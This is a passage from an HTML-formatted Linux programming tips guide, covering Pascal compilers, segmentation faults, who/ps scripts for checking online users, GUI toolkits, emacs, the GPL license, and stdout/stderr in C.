toupper($0) }' old_file &gt; new_file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Sed and Awk are useful for a lot of other uses, and are integrated in several products.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.7</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 7: Using PASCAL on Linux</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux comes with a lot of compilers and interpreters. These include programs for C, C++, Perl, TCL/TK and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >more. Unfortunately most Linux distributions don't come with a Pascal compiler. Is it possible to compile</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Pascal programs? It sure is.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several projects were started to make a Pascal compiler for Linux. One is called GNU Pascal and is available</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://agnes.dida.physik.uni-essen.de/~gnu-pascal</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. That program will also run on any operating system</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >that supports the GNU C compiler.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.8</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 8: Segmentation fault</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >One of the most common problems when making software is errors like "Segmentation fault", also called</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >SegFault. Here is what a SegFault is.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Virtual memory in a computer can be created in 2 ways: pages or segments. Paging means that the memory is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >divided in pages of equal size, containing words of memory in it. Segmentation means that every process has</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >a segment of memory of needed size, with gaps of empty memory blocks between the segments.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The operating system knows the upper limit of every segment, and every segment begins at a virtual address</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >0. When a program accesses a memory block, it calls a virtual address that the Memory Management Unit</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >(MMU) maps to a real address. If the operating system sees that the requested address doesn't match any</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >valid address in the segment, it will send a signal to the process terminating it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >SegFaults are the direct result of a memory error. The program has a bad pointer, a memory leak or any kind</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >of error that makes it access the wrong memory address. To correct these errors you need to check pointers</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and arrays for errors.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.9</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 9: Who is online?</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Many system administrators use scripts to help them in the process of managing a server. A common problem</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >is finding out exactly what users are on the system and what they are doing.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several tools are available on the system to see who is online, what processes are running, and pipeing them</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >together can resolve many problems. Here are 2 small scripts that will show, first if a user is online, and then</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >what he is running:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >who | grep $1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ps -aux | grep $1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The variable $1 here means the first command line argument, from a shell script. The who command first</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >checks if the user is online, then ps will show all the processes currently running under that user's UID.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.10</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 10: Graphical toolkits</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Most Unix programs are console based. This is mainly because several years ago, most computer users were</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >on text-only stations linked to big mainframes.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Now, Linux is becoming a full graphical desktop, and needs graphical programs, or at least frontends to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >text-only programs. This is where graphical tookits come in. Here is a list of some of the toolkits available to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux programmers:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >GTK </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >- This is currently a very popular toolkit, and is the base of the GNOME desktop. It is C</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >based and easy to work with.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >QT </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >- QT is a C++ toolkit made by Troll Tech. It is the base of the popular KDE desktop.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >WXwindows </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >- This is a very complete C++ toolkit that is cross-platform. The same code</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >should work on Windows, the MacOS, Unix (Motif and GTK) and others.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >GraphApp </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >- This is also a cross-platform toolkit, but is one of the easiest libraries I ever saw. It</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >supports a smaller set of widgets, but takes only hours to learn. It will work on Windows, the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >MacOS, Unix (Motif and Athena) and others.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.11</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 11: IDE and visual interfaces</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you are a programmer that comes from the Windows world, you may be used to code in a visual interface</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >or an IDE. Coding in a text editor and then going to the shell to compile may be the traditional way of Unix</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and Linux users, but it may not be what you are looking for.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >You can use a visual interface in Linux too. Searching for "visual" or "IDE" at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.freshmeat.net </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >will</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >return a few programs available to you. But there may be a much better way.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The purpose of a visual interface is to make coding more efficient. There are many so-called programmer</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >editors. These are text editors so powerful that you can do everything with them. This includes editing</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >multiple files, compiling and even debugging your program.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >One of them is emacs, available from the GNU project. It is so powerful that it enables you to edit text,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >compile, read mail, newsgroups, and even browse the Web. It may seem far more complex than your usual</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Windows visual editor, but it may prove really interesting in the end.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.12</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 12: Free software and copyleft</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Most software programs under Linux come under the GPL license. The so-called copyleft agreement. It may</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >be confusing to new Linux programmers. Here are the main features of the license, and why you may or may</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >not want to use it for your programs. The full license is available from the GNU site at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.gnu.org</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The GPL license provides software free. Not as in free of charge, but in freedom. You can charge money for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >free software or software under the GPL. What you can't do is restrict its use.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You must provide source code, or a way for the user to have access to that source code. This means that if</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you release a program as a binary only, it can't be under the GPL license and may not contain GPL code from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >other people.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you use code available from other people under the GPL license, you can modify it and redistribute it under</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the same license, with source code. Also, you must keep the previous copyright notices, and write down in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the program what changes you have made to it. This also means that anyone can modify your programs, as</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >long as they keep your copyright notices there, and release their modifications under the same license.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >3.13</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 13: Talking to the terminal</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Under DOS, or other text based systems, there is only one way in and one way out. Under Linux and every</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Unix system, there is one way in but two ways out.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The terminal has 2 outputs, one for standard output and one for errors. By default, they both display on the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >same device: your monitor. But they can be redirected, for example, to different logs. This is why it's</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >important for you to use them properly.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The standard output is called stdout, and printing to it will print to the screen, or where it is redirected. In C, it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >may look like this:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >fprintf(stdout, "Test\n");</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The standard error is called stderr:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >fprintf(stderr, "Error\n");</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To input, you need to read from the standard input, called stdin. They are all available to you from the stdio.h</FONT></SPAN></P>  <P style="MARGIN: 0cm 